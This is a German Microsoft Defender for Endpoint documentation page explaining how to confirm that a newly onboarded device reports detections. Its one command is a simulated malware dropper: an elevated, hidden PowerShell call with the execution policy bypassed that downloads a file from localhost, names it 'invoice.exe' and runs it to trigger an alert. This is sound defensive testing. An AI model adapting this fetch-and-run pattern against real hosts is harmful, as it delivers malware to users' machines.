---
title: Ausführen eines Erkennungstests auf einem neu integrierten Microsoft Defender for Endpoint-Gerät
description: Führen Sie das Erkennungsskript auf einem neu integrierten Gerät aus, um zu überprüfen, ob es ordnungsgemäß in den Microsoft Defender for Endpoint-Dienst integrierte ist.
keywords: Erkennungstest, Erkennung, Powershell, Skript, Überprüfen, Onboarding, Microsoft Defender für Endpunkt-Onboarding, Clients, Server, Test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 2bb1fde1bfd8ddfa358d1141c3821843e532a8bf
ms.sourcegitcommit: efb932db63ad3ab4af4b585428d567d069410e4e
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 05/11/2021
ms.locfileid: "52312000"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Ausführen eines Erkennungstests auf einem neu integrierten Microsoft Defender for Endpoint-Gerät 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Gilt für:**
- Unterstützte Windows 10 Versionen
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, Version 1803
- Windows Server, 2019
- [Microsoft Defender für Endpunkt](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Möchten Sie Microsoft Defender for Endpoint erleben? [Registrieren Sie sich für eine kostenlose Testversion.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Führen Sie das folgende PowerShell-Skript auf einem neu integrierten Gerät aus, um sicherzustellen, dass es ordnungsgemäß an den Defender for Endpoint-Dienst meldet.

1. Erstellen Sie einen Ordner: "C:\test-MDATP-test".
2. Öffnen Sie eine Eingabeaufforderung mit erhöhten Rechten auf dem Gerät, und führen Sie das Skript aus:

   1. Wechseln Sie zu **Start**, und geben Sie **cmd** ein.

   1. Klicken Sie mit **der rechten Maustaste auf Eingabeaufforderung,** und wählen Sie Als Administrator ausführen **aus.**

      ![Fensteranfangsmenü, das auf Als Administrator ausführen zeigt](images/run-as-admin.png)

3. Kopieren Und führen Sie an der Eingabeaufforderung den folgenden Befehl aus:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Das Eingabeaufforderungsfenster wird automatisch geschlossen. Bei erfolgreicher Erkennung wird der Erkennungstest als abgeschlossen markiert, und eine neue Warnung wird in etwa 10 Minuten im Portal für das integrierte Gerät angezeigt.

## <a name="related-topics"></a>Verwandte Themen
- [Onboarding von Windows 10-Geräten](configure-endpoints.md)
- [Onboarding von Servern](configure-server-endpoints.md)
- [Behandeln von Problemen beim Onboarding von Microsoft Defender for Endpoint](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
